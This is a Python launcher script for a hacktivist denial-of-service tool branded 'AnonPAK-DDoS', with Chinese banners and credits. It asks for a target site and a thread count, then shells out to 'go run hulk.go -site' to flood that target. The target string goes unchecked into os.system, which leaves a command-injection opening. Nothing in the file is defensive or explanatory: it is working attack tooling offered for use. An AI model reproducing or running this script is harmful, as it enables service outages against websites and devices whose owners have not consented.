from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet AnonymousPAK DDoS Attack')
else:
    os.system('pyfiglet AnonymousPAK  DDoS Attack')

print(Back.GREEN + Fore.GREEN +'[+] 匿名DDoS工具，制作者：' + Fore.RED + 'Anonymous Pakistan Community                              ') 
print(Back.GREEN + Fore.BLACK + '[+] AnonPAK-DDoS工具 测试版0.1                                             ')
print(Back.BLACK +Fore.GREEN + '[+] AnonPAK-DDoS 工具 Python互动菜单 制作者：Muneeb Khurram                         ')
print(Fore.YELLOW + '[+] 我们是一个匿名的军团，我们不会原谅，我们不会忘记                            ')
print(Fore.GREEN + '[+] 开始AnonPAK DoS工具，将1024个基线线程作为默认线程，根据需要进行以下更改           ')
print(Fore.BLUE + '作者：' + Fore.GREEN + 'Muneeb Khurram (UBISOFT-1)')
print(Fore.RED + '油管： ' + Fore.GREEN + 'https://www.youtube.com/channel/UCzYulTuhxSIqSlW2PqTkkEw')
print(Fore.YELLOW + 'GitHub：' + Fore.GREEN + 'https://github.com/ubisoft-1')
print(Fore.BLUE + '翻译者：' + Fore.GREEN + '宇涵（E-hydrogen）')
print(Fore.RED + '翻译者B站： ' + Fore.GREEN + 'https://space.bilibili.com/549633102')
print(Fore.YELLOW + '翻译者GitHub：' + Fore.GREEN + 'https://github.com/E-hydrogen')
print('你的系统'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Collab [Y/N]')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')
